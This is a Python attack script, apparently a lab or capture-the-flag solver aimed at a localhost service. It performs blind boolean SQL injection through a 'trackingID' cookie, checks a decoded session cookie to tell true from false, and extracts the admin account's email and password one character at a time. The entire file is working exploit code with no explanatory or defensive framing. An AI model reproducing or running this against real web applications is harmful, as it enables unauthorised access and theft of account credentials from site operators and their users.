import requests
import base64
import json
import http.cookiejar

IDENTITY_BASE = "http://127.0.0.1:5800/"

BRUTE_FORCE = """0123456789abcdefghijklmnopqrstuvwxyz!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""


def decode_cookie(cookie):
    padding = '=' * (4 - len(cookie) % 4)
    cookie = cookie.split('.')[0]
    cookie += padding
    try:
        data_dict = json.loads(base64.b64decode(cookie))
        if data_dict['email'] == 'Error':
            return False
        return True
    except Exception:
        return 'Failed to decode'


def change_cookie(originialID, session, injection="' AND ''='"):
    for cookie in session.cookies:
        if cookie.name == 'trackingID':  # Replace with the actual cookie name
            cookie.value = originialID+injection
    response = session.get(IDENTITY_BASE)
    for cookie in session.cookies:
        if cookie.name == 'session':
            return decode_cookie(cookie.value)


def get_length(field, originalID, session):
    for i in range(1, 100):
        injection = f"' AND (SELECT 'a' FROM users WHERE privilege='admin' AND LENGTH({field})={i})='a"
        if change_cookie(originalID, session, injection):
            return i
    return 'Failed'


def get_credential(field, originalID, session, length):
    ans = ''
    for i in range(1, length + 1):
        for char in BRUTE_FORCE:
            injection = f"' AND (SELECT SUBSTRING({field},{i},1) FROM users WHERE privilege='admin')='{char}"
            if change_cookie(originalID, session, injection):
                ans += char
                print(ans)
    return ans



def main():
    cookie_jar = http.cookiejar.CookieJar()
    cookie_processor = requests.cookies.RequestsCookieJar()
    cookie_processor._cookies = cookie_jar

    session = requests.Session()
    session.cookies = cookie_jar

    response = session.get(IDENTITY_BASE)
    tracking = response.cookies['trackingID']

    email_length = get_length('email', tracking, session)
    password_length = get_length('password', tracking, session)

    print("GETTING EMAIL")
    email = get_credential('email', tracking, session, email_length)
    print("\n\nGETTING PASSWORD")
    password = get_credential('password', tracking, session, password_length)

    print(f"\n\n\nEmail = {email} \nPassword = {password}")





if __name__=="__main__":
    main()
